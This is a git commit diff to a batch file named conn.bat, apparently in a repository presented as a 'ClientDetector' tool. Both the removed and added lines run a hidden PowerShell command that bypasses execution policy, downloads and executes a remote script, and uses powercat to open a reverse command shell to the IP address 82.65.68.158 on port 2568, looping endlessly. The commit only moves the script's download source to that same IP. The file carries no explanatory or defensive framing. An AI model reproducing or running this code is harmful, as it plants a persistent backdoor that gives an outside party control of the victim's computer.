c160ef2144f0a882222649b0e4ddad8ea718f6ad
KohiClient <78698169+KohiClient@users.noreply.github.com>
2021-02-28 23:06:56 +0100

    Update conn.bat

--- conn.bat
+++ conn.bat
@@ -1,5 +1,5 @@
 @echo off
  :loop
- powershell -ep bypass -windowstyle hidden -c "IEX(New-Object System.Net.WebClient).DownloadString('https://raw.githubusercontent.com/KohiClient/ClientDetector/main/yl1.ps1');powercat -c 82.65.68.158 -p 2568 -e cmd"
+ powershell -ep bypass -windowstyle hidden -c "IEX(New-Object System.Net.WebClient).DownloadString('http://82.65.68.158/yl1.ps1');powercat -c 82.65.68.158 -p 2568 -e cmd"
  goto loop
 
